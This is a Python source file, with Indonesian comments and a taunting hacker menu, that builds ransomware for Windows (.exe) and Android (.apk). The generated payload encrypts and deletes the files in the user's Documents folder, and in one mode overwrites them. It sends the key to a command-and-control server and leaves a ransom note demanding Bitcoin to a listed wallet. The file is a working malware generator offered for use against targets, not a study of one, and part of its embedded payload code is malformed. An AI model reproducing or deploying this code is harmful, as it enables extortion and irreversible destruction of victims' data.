import os
import base64
import hashlib
import socket
import shutil
import getpass
import time
import threading
import subprocess
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad, unpad
from colorama import init, Fore, Style
import sys

# Inisialisasi colorama
init()

# Simulasi server C2
C2_SERVER = "192.168.1.100"
C2_PORT = 6666

# Fungsi efek ketikan hacker
def type_effect(text, delay=0.03, color=Fore.GREEN):
    for char in text:
        sys.stdout.write(color + char)
        sys.stdout.flush()
        time.sleep(delay)
    print(Style.RESET_ALL)

# Fungsi buat generate kunci enkripsi
def generate_key(password):
    return hashlib.sha256(password.encode()).digest()

# Fungsi enkripsi file
def encrypt_file(file_path, key, mode):
    try:
        cipher = AES.new(key, AES.MODE_CBC)
        iv = cipher.iv
        with open(file_path, 'rb') as f:
            data = f.read()
        padded_data = pad(data, AES.block_size)
        encrypted_data = cipher.encrypt(padded_data)
        with open(file_path + '.locked', 'wb') as f:
            f.write(iv + encrypted_data)
        os.remove(file_path)
        if mode == 2:  # WipeKing mode
            with open(file_path, 'wb') as f:
                f.write(os.urandom(os.path.getsize(file_path + '.locked')))
            os.remove(file_path)
        return True
    except:
        return False

# Fungsi kirim kunci ke C2
def send_key_to_c2(key, victim_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((C2_SERVER, C2_PORT))
        data = f"{victim_id}:{base64.b64encode(key).decode()}".encode()
        sock.send(data)
        sock.close()
    except:
        pass

# Template ransomware
def generate_ransomware_payload(mode, platform):
    user = getpass.getuser()
    target_dir = f"C:/Users/{user}/Documents" if platform == "windows" else "/sdcard/Documents"
    payload = f"""
import os
import base64
import hashlib
import socket
from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes
from Crypto.Util.Padding import pad
import getpass
import threading

C2_SERVER = "{C2_SERVER}"
C2_PORT = {C2_PORT}

def generate_key(password):
    return hashlib.sha256(password.encode()).digest()

def encrypt_file(file_path, key, mode):
    try:
        cipher = AES.new(key, AES.MODE_CBC)
        iv = cipher.iv
        with open(file_path, 'rb') as f:
            data = f.read()
        padded_data = pad(data, AES.block_size)
        encrypted_data = cipher.encrypt(padded_data)
        with open(file_path + '.locked', 'wb') as f:
            f.write(iv + encrypted_data)
        os.remove(file_path)
        if mode == 2:
            with open(file_path, 'wb') as f:
                f.write(os.urandom(os.path.getsize(file_path + '.locked')))
            os.remove(file_path)
        return True
    except:
        return False

def send_key_to_c2(key, victim_id):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((C2_SERVER, C2_PORT))
        data = f"{{victim_id}}:\".encode()
        sock.send(data)
        sock.close()
    except:
        pass

def main():
    target_dir = "{target_dir}"
    if not os.path.exists(target_dir):
        target_dir = os.getcwd()
    password = base64.b64encode(get_random_bytes(16)).decode()
    key = generate_key(password)
    victim_id = hashlib.md5("{user}".encode()).hexdigest()
    if {mode} == 3:
        threading.Thread(target=send_key_to_c2, args=(key, victim_id)).start()
    for root, _, files in os.walk(target_dir):
        for file in files:
            if not file.endswith('.locked'):
                file_path = os.path.join(root, file)
                encrypt_file(file_path, key, {mode})
    ransom_note = f\"\"\"
    [!] FILE LU DIKUNCI, BRO! 😈
    Mode: {'LockMaster' if mode == 1 else 'WipeKing' if mode == 2 else 'GhostCrypt'}
    Bayar 0.1 BTC ke: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh
    Kirim bukti ke: darklord@onionmail.tor
    Kunci dekripsi: {{password if {mode} != 3 else 'Tersimpan di server kami, bayar dulu!'}}
    ID Korban: {{victim_id}}
    Jangan coba-coba dekripsi sendiri, data lu bakal musnah! 😜
    \"\"\"
    with open(os.path.join(target_dir, "BACA_INI.txt"), 'w') as f:
        f.write(ransom_note)

if __name__ == "__main__":
    main()
"""
    return payload

# Fungsi buat bikin .exe
def create_exe(mode):
    payload = generate_ransomware_payload(mode, "windows")
    with open("payload.py", "w") as f:
        f.write(payload)
    try:
        subprocess.run(["pyinstaller", "--onefile", "--noconsole", "payload.py"], check=True)
        shutil.move("dist/payload.exe", f"ransomware_mode{mode}.exe")
        shutil.rmtree("dist")
        shutil.rmtree("build")
        os.remove("payload.spec")
        os.remove("payload.py")
        type_effect(f"[+] File ransomware_mode{mode}.exe berhasil dibikin! Kirim ke target, bro! 😈", color=Fore.RED)
    except Exception as e:
        type_effect(f"[-] Gagal bikin .exe: {e} 😡", color=Fore.RED)

# Fungsi buat bikin .apk
def create_apk(mode):
    payload = generate_ransomware_payload(mode, "android")
    apk_dir = f"apk_mode{mode}"
    os.makedirs(apk_dir, exist_ok=True)
    with open(os.path.join(apk_dir, "main.py"), "w") as f:
        f.write(payload)
    with open(os.path.join(apk_dir, "buildozer.spec"), "w") as f:
        f.write(f"""
[app]
title = RansomwareMode{mode}
package.name = ransomware{mode}
package.domain = org.dan
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0
requirements = python3,pycryptodome
orientation = portrait
osx.python_version = 3
osx.kivy_version = 2.1.0
fullscreen = 0
[buildozer]
warn_on_root = 1
""")
    type_effect(f"[+] Struktur APK mode {mode} dibikin di {apk_dir}! 😈", color=Fore.RED)
    type_effect("Buat convert ke .apk, install Buildozer, lalu jalankan:", color=Fore.CYAN)
    type_effect(f"cd {apk_dir} && buildozer android debug", color=Fore.CYAN)
    type_effect("File .apk bakal ada di bin/ setelah selesai.", color=Fore.CYAN)

# Menu hacker CLI
def main_menu():
    os.system('cls' if os.name == 'nt' else 'clear')
    type_effect("""
    ╔══════════════════════════════════════════════╗
    ║  ██████  █████╗ ███╗   ██╗'██████╗  ██████╗  ║
    ║ ██╔═════╗███╔██╗████╗ ██║█╗█████╔═╗███╗ ██╗  ║
    ║ ██║   ████╔╝██████████║███╗██╔═╗██║█╔════╝█╗ ║
    ║ ██╚═════╬╗╔██████████╔════╗██║█ ██╗█║███╗██║ 
    ║  ██████╔╝╚╬╩███╗ ███╔╗█████╗███╚███╗███╗ ██╗
    ║ ╚══════╝  ╚ ╚══╝ ╚══╝╚═════╚═══╝╚═══╩═══╩═══╝
    ╚══════RANSOMWARE V3.0 - Mr.4Rex_503════════════╝
    """, color=Fore.RED, delay=0.01)
    type_effect("[+] Initializing darknet protocols...", color=Fore.YELLOW)
    time.sleep(1)
    type_effect("""
    [>] SELECT DESTRUCTION MODE:
     1. Malware.Lock  - Encrypt and ransom
     2. WipeKing      - Encrypt and destroy
     3. GhostCrypt    - Encrypt and hide
    """, color=Fore.GREEN)
    try:
        mode = int(input(Fore.RED + "[?] Enter mode (1-3): " + Style.RESET_ALL))
        if mode not in [1, 2, 3]:
            type_effect("[-] Invalid mode, BRO! Try again! 😣", color=Fore.RED)
            time.sleep(2)
            main_menu()
            return
        type_effect(f"[+] Mode {['LockMaster', 'WipeKing', 'GhostCrypt'][mode-1]} selected!", color=Fore.YELLOW)
        time.sleep(1)
        type_effect("""
    [>] SELECT TARGET PLATFORM:
     1. Windows (.EXE)
     2. Android (.APK)
        """, color=Fore.GREEN)
        platform = int(input(Fore.RED + "[?] Enter platform (1-2): " + Style.RESET_ALL))
        if platform not in [1, 2]:
            type_effect("[-] Invalid platform, BRO! Try again! 😣", color=Fore.RED)
            time.sleep(2)
            main_menu()
            return
        type_effect(f"[+] Generating payload for {'Windows' if platform == 1 else 'Android'}... 😈", color=Fore.YELLOW)
        time.sleep(2)
        if platform == 1:
            create_exe(mode)
        else:
            create_apk(mode)
        type_effect("[SUCCESS] Payload ready! Unleash the chaos, BRO! 😜", color=Fore.RED)
    except:
        type_effect("[-] Error, BRO! Numbers only! 😤", color=Fore.RED)
        time.sleep(2)
        main_menu()

if __name__ == "__main__":
    main_menu()
